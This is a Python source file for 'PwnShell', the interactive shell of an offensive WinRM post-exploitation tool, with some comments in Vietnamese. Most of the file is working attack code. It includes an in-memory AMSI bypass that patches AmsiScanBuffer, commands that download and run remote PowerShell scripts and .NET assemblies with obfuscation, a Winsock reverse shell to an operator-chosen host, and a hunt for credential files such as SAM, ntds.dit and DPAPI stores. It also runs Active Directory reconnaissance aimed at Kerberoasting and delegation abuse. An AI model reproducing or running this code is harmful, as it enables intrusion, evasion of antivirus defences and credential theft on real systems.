"""
shell.pwnshell — PwnShell interactive shell
"""

import os, sys, logging, time, textwrap, stat
from pathlib import PureWindowsPath, Path
from ipaddress import ip_address
from base64 import b64decode
from random import randbytes
from datetime import datetime
from Cryptodome.Hash import MD5

try:
    from prompt_toolkit import prompt, ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.completion import WordCompleter
    _PTK = sys.stdout.isatty()
except ImportError:
    _PTK = False

# ── imports from sibling modules ─────────────────────────────────────────────
from ..core.utils import strip_ansi
from .ui       import R, G, Y, B, M, C, W, DIM, BLD, RST, c, _BANNER, _COMPLETIONS
from .ctrlc    import CtrlCHandler
from .adtriage import get_adtriage_ps
from .commands import (
    chunks, b64str, split_args, xorenc, str_b64,
    _xor_key,
    new_HostWriter, import_HostWriter,
    call_XorEnc, import_XorEnc,
    _importPathFix, _new_PathFix,
    # dll_import generated variables:
    _import_LoadLibrary,    _call_LoadLibrary,
    _import_GetProcAddress, _call_GetProcAddress,
    _import_VirtualProtect, _call_VirtualProtect,
    _import_CreateProcess,  _call_CreateProcess,
    _import_WSAStartup,     _call_WSAStartup,
    _import_WSASocket,      _call_WSASocket,
    _import_WSAConnect,     _call_WSAConnect,
)


# ─────────────────────────────────────────────────────────────────────────────
#  COPY NGUYÊN VĂN class PwnShell từ pwnrm.py GỐC vào đây
#  (từ dòng "class PwnShell:" đến hết method "download")
#  KHÔNG THAY ĐỔI BẤT KỲ LOGIC NÀO BÊN TRONG CLASS
# ─────────────────────────────────────────────────────────────────────────────

# ── Session data directory ────────────────────────────────────────────────────
# [BUG-01 & NICHE-01 FIX] Enforce 0o700 permission on _PWNRM_DIR so other local
# users cannot read command history or transcript logs containing credentials.
_PWNRM_DIR = Path(os.environ.get("PWNRM_DIR", str(Path.home() / ".pwnrm")))
_PWNRM_DIR.mkdir(parents=True, exist_ok=True)
try:
    os.chmod(_PWNRM_DIR, stat.S_IRWXU)
    import platform
    if platform.system() == "Windows":
        import subprocess
        user = os.environ.get("USERNAME")
        if user:
            subprocess.run(
                ["icacls", str(_PWNRM_DIR), "/inheritance:r", "/grant", f"{user}:(OI)(CI)F"],
                capture_output=True,
                creationflags=0x08000000
            )
except OSError:
    pass

# ── PwnShell ──────────────────────────────────────────────────────────────────
class PwnShell:

    from .. import __version__ as _pkg_version
    VERSION = _pkg_version

    def __init__(self, runspace, target_info: dict | None = None):
        self.runspace    = runspace
        self.cwd         = ""
        self.stdout_log  = None
        self.need_clear  = False
        self.start_time  = datetime.now()
        self.target_info = target_info or {}
        self.cmd_count   = 0

        if _PTK:
            hist_path = _PWNRM_DIR / ".pwnrm_history"
            if hist_path.is_symlink():
                hist_path.unlink()
            if not hist_path.exists():
                try:
                    fd = os.open(str(hist_path), os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
                    os.close(fd)
                except OSError:
                    pass
            else:
                try:
                    os.chmod(str(hist_path), stat.S_IRUSR | stat.S_IWUSR)
                except OSError:
                    pass
            self.prompt_history = FileHistory(str(hist_path))
            self._completer = WordCompleter(_COMPLETIONS, ignore_case=True)

    def __del__(self):
        self.stop_log()

    # ── logging ───────────────────────────────────────────────────────────────
    def start_log(self):
        if not self.stdout_log:
            fn = str(_PWNRM_DIR / f"pwnrm_{int(time.time())}_{randbytes(4).hex()}_stdout.log")
            self.write_info(f"Logging to {c(C, fn)}")
            flags = os.O_CREAT | os.O_EXCL | os.O_WRONLY | os.O_APPEND
            fd = os.open(fn, flags, 0o600)
            self.stdout_log = os.fdopen(fd, "wb")

    def stop_log(self):
        if self.stdout_log:
            self.stdout_log.close()
            self.stdout_log = None

    # ── help / banner ─────────────────────────────────────────────────────────
    def help(self):
        elapsed = str(datetime.now() - self.start_time).split(".")[0]
        tgt = self.target_info.get("host","?")
        usr = self.target_info.get("user","?")

        print(_BANNER)
        print(textwrap.dedent(f"""\
        {BLD}  Session Info{RST}
          Target  : {c(C,tgt)}
          User    : {c(G,usr)}
          Elapsed : {elapsed}    Commands run: {self.cmd_count}

        {BLD}  Key Commands{RST}

          {c(Y,'!download')} RPATH [LPATH]          Pull file/dir (dirs → ZIP)
          {c(Y,'!upload')} [-xor] LPATH [RPATH]     Push file; -xor for stealthy staging
          {c(Y,'!amsi')}                             Patch AmsiScanBuffer in-process
          {c(Y,'!psrun')} [-xor] URL                Load & exec remote PS1 (obfuscated ScriptBlock)
          {c(Y,'!netrun')} [-xor] URL [ARG..]        Load & exec remote .NET assembly
          {c(Y,'!revshell')} IP PORT                 Raw Winsock reverse shell (full I/O)
          {c(Y,'!adtriage')} [-q]                    {c(M,'[NEW]')} AD post-auth recon:
                                               SPNs · AS-REP · delegation · ADCS·
                                               gMSA/dMSA · ACL quick-wins · BadSuccessor
          {c(Y,'!sysinfo')}                          Quick OS / AV / hotfix snapshot
          {c(Y,'!creds')}                            DPAPI / PowerShell history / credential hint
          {c(Y,'!log')} / {c(Y,'!stoplog')}                  Toggle session transcript
          exit / quit / Ctrl+D               Close session
          Ctrl+C                             Gracefully interrupt running command

        {c(DIM,'  Tab-completion available for all ! commands.')}
        """))

    # ── REPL ──────────────────────────────────────────────────────────────────
    def repl(self, inputs=None):
        self.update_cwd()

        for raw in (inputs or self.read_line()):
            cmd = raw.strip()
            if not cmd:
                continue
            self.cmd_count += 1

            if cmd in {"exit","quit","!exit","!quit"}:
                print(c(DIM, "\n  [~] Session closed. Stay stealthy.\n"))
                return

            dispatch = [
                ("!download ",  self.download),
                ("!upload ",    self.upload),
                ("!amsi",       lambda _: self.amsi_bypass()),
                ("!netrun ",    self.netrun),
                ("!psrun ",     self.psrun),
                ("!revshell ",  self.revshell),
                ("!adtriage",   self._adtriage_dispatch),
                ("!sysinfo",    lambda _: self.sysinfo()),
                ("!creds",      lambda _: self.creds_hint()),
                ("!log",        lambda _: self.start_log()),
                ("!stoplog",    lambda _: self.stop_log()),
            ]

            matched = False
            for prefix, fn in dispatch:
                if cmd.lower().startswith(prefix.lower()):
                    fn(cmd[len(prefix):].strip())
                    matched = True
                    break

            if not matched:
                if cmd.startswith("!") or cmd in {"help","?"}:
                    self.help()
                else:
                    if self.stdout_log:
                        self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
                        self.stdout_log.flush()
                    self.run_with_interrupt(cmd, self.write_line)
                    self.update_cwd()

    # ── prompt / input ────────────────────────────────────────────────────────
    def update_cwd(self):
        self.cwd = strip_ansi(self.run_sync("Get-Location | Select -Expand Path").strip())

    def read_line(self):
        while True:
            try:
                ps_pre = f"{BLD}{M}PwnRM{RST}|{c(C,self.cwd)}> "
                if _PTK:
                    cmd = prompt(ANSI(ps_pre), history=self.prompt_history,
                                 completer=self._completer,
                                 enable_history_search=True)
                else:
                    cmd = input(ps_pre)
            except KeyboardInterrupt:
                continue
            except EOFError:
                return
            else:
                yield cmd

    # ── output handlers ───────────────────────────────────────────────────────
    def _clear(self):
        return "\033[2K\r" if self.need_clear else ""

    def write_line(self, out):
        clr = self._clear(); self.need_clear = False
        log = b""
        if "stdout" in out:
            txt = strip_ansi(out["stdout"])
            print(clr + txt, flush=True)
            log = txt.encode() + b"\n"
        elif "info" in out:
            txt = strip_ansi(out["info"])
            print(clr + txt, end=out["endl"], flush=True)
            log = (txt + out["endl"]).encode()
        elif "error" in out:
            print(clr + c(R, strip_ansi(out["error"])), flush=True)
        elif "warn" in out:
            print(clr + c(Y, "  [!] " + strip_ansi(out["warn"])), flush=True)
        elif "verbose" in out:
            print(clr + c(DIM, strip_ansi(out["verbose"])), flush=True)
        elif "progress" in out:
            print(clr + c(B, "  [~] " + strip_ansi(out["progress"])), end="\r", flush=True)
            self.need_clear = True
        if self.stdout_log and log:
            self.stdout_log.write(log); self.stdout_log.flush()

    def write_info(self, msg):    self.write_line({"info": msg, "endl": "\n"})
    def write_warning(self, msg): self.write_line({"warn": msg})
    def write_error(self, msg):   self.write_line({"error": msg})
    def write_progress(self, msg):self.write_line({"progress": msg})

    def run_sync(self, cmd, max_bytes=1048576):  # [HIGH-05 FIX] 1MB cap for sync commands to prevent OOM
        out = []
        total = 0
        for o in self.runspace.run_command(cmd):
            if "stdout" in o:
                chunk = o["stdout"]
                if total + len(chunk) > max_bytes:
                    out.append("\n[!] run_sync output truncated (exceeded max_bytes protection).")
                    self.runspace.interrupt()
                    break
                out.append(chunk)
                total += len(chunk)
        return "\n".join(out)

    def run_with_interrupt(self, cmd, handler=None, exc_handler=None):
        stream = self.runspace.run_command(cmd)
        while True:
            with CtrlCHandler(timeout=5) as h:
                try:
                    out = next(stream)
                except StopIteration:
                    break
                except Exception as e:
                    if exc_handler and exc_handler(e):
                        continue
                    raise
                if handler:
                    handler(out)
            if h.interrupted:
                self.runspace.interrupt()
                return True
        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  BUILT-IN COMMANDS
    # ══════════════════════════════════════════════════════════════════════════

    # ── !adtriage (NEW in v1.0.1) ─────────────────────────────────────────────
    def _adtriage_dispatch(self, args):
        quick = "-q" in args.lower() or "--quick" in args.lower()
        self.adtriage(quick=quick)

    def adtriage(self, quick=False):
        """
        AD Triage — runs an entirely self-contained PowerShell enumeration
        inside the remote session.  No extra binaries needed on target.
        Covers: identity, domain basics, HV groups, Kerberoast, AS-REP,
        unconstrained/constrained/RBCD delegation, ADCS (ESC1/3/4 quick scan),
        gMSA/dMSA (BadSuccessor hint), ACL quick-wins, pre-2000 compat access,
        and accounts with password-never-expires + adminCount=1.
        """
        self.write_info(c(M+BLD, "  [*] PwnRM AD Triage — loading remote enumeration module..."))
        ps = get_adtriage_ps(quick=quick)
        # Inject as a ScriptBlock to stay under AMSI radar
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"powershell -NonInteractive -EncodedCommand {encoded}"
        # Prefer direct Invoke-Expression so the output streams correctly
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        self.run_with_interrupt(cmd, self.write_line)

    # ── !sysinfo ──────────────────────────────────────────────────────────────
    def sysinfo(self):
        self.write_info(c(C, "  [*] System snapshot"))
        cmds = [
            # OS / hostname / build
            'Write-Host "`n[OS]"; $o=Get-WmiObject Win32_OperatingSystem;'
            '"  Name     : "+$o.Caption; "  Build    : "+$o.BuildNumber;'
            '"  Hostname : "+$env:COMPUTERNAME; "  Domain   : "+$env:USERDNSDOMAIN',
            # Hotfixes (last 10)
            'Write-Host "`n[Hotfixes (last 10)]";'
            'Get-HotFix | Sort InstalledOn -Desc | Select -First 10 | '
            'ForEach-Object { "  "+$_.HotFixID+" "+$_.Description+" "+$_.InstalledOn }',
            # AV products
            'Write-Host "`n[AV Products]";'
            'try { Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct |'
            'ForEach-Object { "  "+$_.displayName } } catch { "  (SecurityCenter2 not available)" }',
            # Local admins
            'Write-Host "`n[Local Administrators]";'
            'net localgroup administrators 2>$null | Select-Object -Skip 6 | '
            'Where-Object { $_ -and $_ -notmatch "----" } | ForEach-Object { "  "+$_ }',
            # WinRM / SMB signing
            'Write-Host "`n[WinRM / SMB]";'
            '"  WinRM port : 5985/5986";'
            'try { $s=Get-SmbServerConfiguration; "  SMB Signing Required: "+$s.RequireSecuritySignature } catch {}',
        ]
        for c_ in cmds:
            self.run_with_interrupt(c_, self.write_line)

    # ── !creds (DPAPI / history hints) ───────────────────────────────────────
    def creds_hint(self):
        self.write_info(c(C, "  [*] Credential artifact hints"))
        ps = r"""
$targets = @(
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    "$env:APPDATA\Microsoft\Credentials",
    "$env:LOCALAPPDATA\Microsoft\Credentials",
    "$env:APPDATA\Microsoft\Protect",
    "C:\Windows\System32\config\SAM",
    "C:\Windows\NTDS\ntds.dit",
    "C:\inetpub\wwwroot\web.config",
    "C:\Windows\Panther\unattend.xml",
    "C:\ProgramData\McAfee\Agent\DB\ma.db"
)
foreach ($t in $targets) {
    if (Test-Path $t -ErrorAction SilentlyContinue) {
        Write-Host "  [+] FOUND: $t" -ForegroundColor Green
    }
}
# Check for saved credentials
$creds = cmdkey /list 2>$null
if ($creds -match "Target") { Write-Host "`n  [!] cmdkey entries:" -ForegroundColor Yellow; $creds | Write-Host }
Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAPI dump"
"""
        self.run_with_interrupt(ps, self.write_line)

    # ── !amsi ─────────────────────────────────────────────────────────────────
    def amsi_bypass(self):
        cmds = [
            _import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect,
            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
            "Start-Sleep -Seconds 1",
            "[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
            "Start-Sleep -Seconds 1",
            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
        ]
        self.write_info(c(Y, "  [*] Patching AmsiScanBuffer..."))
        for cmd in cmds:
            logging.debug(cmd)
            self.run_with_interrupt(cmd, self.write_line)
        self.write_info(c(G, "  [+] AMSI bypass applied."))

    # ── !psrun ────────────────────────────────────────────────────────────────
    def psrun(self, cmdline):
        args   = split_args(cmdline)[:2]
        # [BUG-04 FIX] Guard empty args before any args[n] access.
        # '!psrun ' (trailing space, no URL) yields args=[] -> IndexError.
        # Same pattern fixed in netrun/upload; psrun was missed.
        if not args:
            self.write_warning("usage: !psrun [-xor] URL"); return
        url    = args[-1]
        xorfunc= ""
        if args[0].lower() == "-xor":
            if len(args) != 2:
                self.write_warning("usage: !psrun [-xor] URL"); return
            if args[-1].lower().startswith("http"):
                self.write_warning("Use -xor only with files uploaded via !upload -xor"); return
            xorfunc = call_XorEnc
        cmds = [
            import_XorEnc,
            f"$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})",
            f"$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))",
            "$c = $c.Ast.EndBlock.Copy()",
            "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
            "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
            "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
            "Remove-Variable @('a','b','c')"
        ]
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !netrun ───────────────────────────────────────────────────────────────
    def netrun(self, cmdline):
        args = split_args(cmdline)
        if not args:
            self.write_warning("usage: !netrun [-xor] URL [ARG..]"); return
        if args[0].lower() == "-xor":
            if len(args) == 1:
                self.write_warning("usage: !netrun [-xor] URL [ARG..]"); return
            xorfunc = call_XorEnc
            args    = args[1:]
        else:
            xorfunc = ""
        args = [str_b64(a) for a in args]
        url  = args[0]
        argv = "[string[]]@(" + ",".join(args[1:]) + ")"
        cmds = [
            import_HostWriter, import_XorEnc,
            f"$buf = (New-Object Net.WebClient).DownloadData({url})",
            f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
            f"$out = {new_HostWriter}",
            f"[Console]::SetOut($out); [Console]::SetError($out)",
            f"[void]$dll.EntryPoint.Invoke($null, [object[]](,[string[]]({argv})))" if args[1:] else
            "[void]$dll.EntryPoint.Invoke($null, $null)",
            "[Console]::SetOut([IO.StreamWriter]::Null)",
            "[Console]::SetError([IO.StreamWriter]::Null)",
            "$out.Dispose()",
            "Remove-Variable @('buf','dll','out')"
        ]
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !revshell ─────────────────────────────────────────────────────────────
    def revshell(self, cmdline):
        args = split_args(cmdline)
        try:
            ip   = ip_address(args[0]).packed
            port = int(args[1])
            if not (1 <= port <= 65535):
                self.write_warning("Port must be between 1 and 65535"); return
            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
        except (ValueError, IndexError):
            self.write_warning("usage: !revshell IP PORT"); return
        cmds = [
            _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
            f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
            f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
            f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
            f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
            "Remove-Variable @('sock','sinfo')"
        ]
        self.write_info(c(Y, f"  [*] Spawning reverse shell → {args[0]}:{args[1]}"))
        for cmd in cmds:
            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)

    # ── !upload ───────────────────────────────────────────────────────────────
    def upload(self, cmdline):
        args = split_args(cmdline)
        if not args:
            self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
        if args[0].lower() == "-xor":
            unxor = False; args = args[1:]
            # [BUG-06 FIX] Guard empty args after -xor strip.
            # '!upload -xor' (no LPATH) leaves args=[] -> IndexError on args[0].
            # netrun() already had this guard (len==1 check); upload() did not.
            if not args:
                self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
        else:
            unxor = True
        src = Path(args[0])
        dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
        try:
            with open(src,"rb") as f: buf = f.read()
        except IOError as e:
            self.write_error(str(e)); return

        temp_raw = self.run_sync("[IO.Path]::GetTempPath()").strip()
        try:
            temp_validated = self._validate_remote_path(temp_raw)
        except ValueError:
            temp_validated = "C:\\Windows\\Temp\\"
        tmpfn = self._pse(temp_validated) + randbytes(8).hex() + ".tmp"
        total = 0
        self.write_info(f"  [~] Uploading → {c(C,str(tmpfn))}")
        self.run_sync(import_XorEnc)
        for chunk in chunks(buf, 65536):
            total += len(chunk)
            chunk_b64 = f"[Convert]::FromBase64String('{b64str(xorenc(chunk, _xor_key))}')"
            xorfunc   = call_XorEnc if unxor else ""
            cmd = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}({chunk_b64})))"
            if self.run_with_interrupt(cmd):
                self.write_warning("Upload interrupted"); self.run_sync(f"Remove-Item -Force '{tmpfn}'"); return
            self.write_progress(f"Upload {total}/{len(buf)} bytes")
        self.write_info(f"  [~] Moving to {c(C,str(dst))}")
        dst_ps = self._pse(dst)
        self.run_with_interrupt(f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst_ps}'", self.write_line)
        h = self.run_sync(f"(Get-FileHash '{dst_ps}' -Algorithm MD5).Hash")
        ok = MD5.new(buf if unxor else xorenc(buf, _xor_key)).hexdigest().upper()
        if h.strip() != ok:
            self.write_error("  Upload integrity check FAILED — file may be corrupted!")
        else:
            self.write_info(c(G, "  [+] Upload complete — MD5 verified."))
    @staticmethod
    def _pse(path) -> str:
        """Escape single quotes for safe PS single-quoted string embedding."""
        return str(path).replace("'", "''")

    @staticmethod
    def _pde(path) -> str:
        """
        Escape a path for embedding inside a PowerShell double-quoted string.
        Escapes: backtick (must be first), dollar sign, double-quote.
        [CRIT-01] Prevents command injection when server-controlled paths are
        placed inside double-quoted PS strings (e.g. Copy-Item "...\\$d").
        """
        s = str(path)
        s = s.replace('`', '``')   # backtick first — PS escape character
        s = s.replace('$', '`$')   # prevent variable/subexpression expansion
        s = s.replace('"', '`"')   # prevent string termination
        return s

    # ── safe Windows path validator ───────────────────────────────────────────
    import re as _re
    _SAFE_WIN_PATH_RE = _re.compile(
        r'^(?:[A-Za-z]:|\\\\[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+)[\\\/][^\x00-\x1f"$`|&;<>{}()]*$'
    )

    @classmethod
    def _validate_remote_path(cls, path: str) -> str:
        """
        Validates a raw path string returned from the remote WinRM server
        before it is embedded into any local PowerShell string context.

        [HIGH-01] A malicious WinRM server can return a Resolve-Path response
        containing PS-injection characters. This method whitelists the path to
        a strict 'drive-letter:\\rest' pattern, blocking any special characters
        that could break out of PS string embedding.

        Raises ValueError with a clear message so callers can surface it to
        the operator instead of silently executing injected code.
        """
        stripped = path.strip()
        if not cls._SAFE_WIN_PATH_RE.match(stripped):
            raise ValueError(
                f"Remote path failed safety validation: {stripped!r}\n"
                "  The WinRM server returned a path containing unsafe characters.\n"
                "  This may indicate a malicious or compromised target."
            )
        return stripped

    # ── !download ─────────────────────────────────────────────────────────────
    def download(self, cmdline):
        args = split_args(cmdline)
        if not args or len(args) > 2:
            self.write_warning("usage: !download RPATH [LPATH]"); return

        # [GHSA-x4cv-p53p-wh3w - SECURITY FIX 1] Lấy tên file từ CHÍNH INPUT CỦA USER (args[0]).
        # Tuyệt đối không dùng src.name do server trả về để tránh bị spoof tên file độc hại.
        user_rpath = PureWindowsPath(args[0])
        safe_filename = user_rpath.name
        
        # Fallback nếu user truyền đường dẫn root (vd: "C:\") thì không có tên file
        if not safe_filename:
            safe_filename = "downloaded_file"

        # Giữ nguyên logic query server để lấy đường dẫn thật (dùng cho logging và check directory)
        src_raw = self.run_sync(f"Resolve-Path -LiteralPath '{self._pse(args[0])}' | Select -Expand Path")
        if not src_raw:
            self.write_warning(f"{args[0]} not found on remote"); return

        # [HIGH-01] Validate the server-returned path against a strict whitelist before
        # embedding it into any PS string. Rejects paths with injection characters
        # ($, `, ", |, &, etc.) that could break out of PS string context.
        try:
            src_validated = self._validate_remote_path(src_raw)
        except ValueError as e:
            self.write_error(str(e)); return

        src    = PureWindowsPath(src_validated)
        src_ps = self._pse(src)   # for single-quoted PS strings
        src_pde = self._pde(src)  # [CRIT-01] for double-quoted PS string context

        
        # [GHSA-x4cv-p53p-wh3w - SECURITY FIX 2] Build đường dẫn local dựa trên safe_filename thay vì src.name
        dst = Path(args[1]) if len(args) == 2 else Path(safe_filename)
        if dst.is_dir(): 
            dst = dst / safe_filename
            
        # [DEFENSE IN DEPTH] Chặn local path traversal nếu user lỡ gõ ".." vào LPATH
        # (Mặc dù CLI thường cho phép, nhưng chặn ở mức filename để an toàn hơn)
        if '..' in dst.name:
            self.write_error("Invalid characters ('..') in destination filename."); return

        if not dst.parent.exists(): 
            os.makedirs(dst.parent, exist_ok=True)

        is_dir = self.run_sync(f"Test-Path -Path '{src_ps}' -PathType Container") == "True"
        if is_dir:
            # Logic tải thư mục vẫn hoạt động bình thường với safe_filename
            if not dst.name.lower().endswith(".zip"): 
                dst = dst.parent / f"{dst.name}.zip"
                
            tmpdir_raw = self.run_sync("[System.IO.Path]::GetTempPath()").strip()
            try:
                tmpdir_validated = self._validate_remote_path(tmpdir_raw)
            except ValueError:
                tmpdir_validated = "C:\\Windows\\Temp\\"
            tmpdir    = self._pse(tmpdir_validated)
            tmpnm     = randbytes(8).hex()
            tmpfn     = tmpdir + tmpnm
            # [CRIT-01] tmpfn is embedded in a double-quoted PS string below;
            # _pde() escapes $, ` and " to prevent injection from a rogue GetTempPath response.
            tmpfn_pde = self._pde(tmpdir + tmpnm)
            ps = f"""
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
Get-ChildItem -Force -Recurse -Path '{src_ps}' | ForEach-Object {{
    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
        try {{
            $d = $_.FullName.Replace('{src_ps}', '')
            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn_pde}\\$d"
        }} catch {{ Write-Warning "skipping $d" }}
    }}
}}
{_importPathFix}
[IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip',
    [IO.Compression.CompressionLevel]::Fastest, $true, ${_new_PathFix})
Remove-Item -Recurse -Force -Path '{tmpfn}'
"""
            self.run_with_interrupt(ps, self.write_line)
            src    = tmpfn + ".zip"
            # [BUG-05 FIX] src was reassigned to the remote zip path but src_ps
            # was never updated — Download-Remote would OpenRead the original
            # directory (fails on Windows) and Remove-Item would delete the
            # original directory instead of the zip temp file.
            src_ps = self._pse(src)

        ps = f"""function Download-Remote {{
    $h = Get-FileHash '{src_ps}' -Algorithm MD5 | Select -Expand Hash;
    $f = [System.IO.File]::OpenRead('{src_ps}');
    $b = New-Object byte[] 65536;
    while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
    $f.Close();
    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
}}
Download-Remote
Remove-Item Function:Download-Remote
"""
        self.write_info(f"  [~] Streaming {c(C,str(src))} ...")
        buf = bytearray()
        # [HIGH-04 FIX] Enforce memory cap to prevent OOM DoS
        max_bytes = int(os.environ.get("PWNRM_MAX_DL", 256 * 1024 * 1024))

        def collect(out):
            if part := out.get("stdout"):
                try:
                    chunk = b64decode(part)
                    if len(buf) + len(chunk) > max_bytes:
                        raise RuntimeError(f"OOM guard: stream exceeds {max_bytes} bytes")
                    buf.extend(chunk)
                    self.write_progress(f"Download {len(buf)} bytes")
                except RuntimeError as e:
                    self.write_error(str(e))
                    raise e
                except Exception:
                    self.write_warning("Received malformed Base64 chunk from server (skipped)")

        self.run_with_interrupt(ps, collect)

        if is_dir: self.run_sync(f"Remove-Item -fo '{src_ps}'")
        # [BUG-02 FIX] Guard against truncated response (< 32 bytes MD5 trailer).
        if len(buf) < 32:
            self.write_error(
                f"  Download failed: server returned {len(buf)} bytes "
                "(expected at least 32-byte MD5 trailer)."
            )
            return
        if buf[-32:] != MD5.new(buf[:-32]).hexdigest().upper().encode():
            self.write_error("  Download integrity check FAILED!")
            return
            
        self.write_info(f"  [+] Writing {c(G,str(dst.resolve()))}")
        try:
            with open(dst,"wb") as f: f.write(buf[:-32])
        except IOError as e:
            self.write_error(str(e))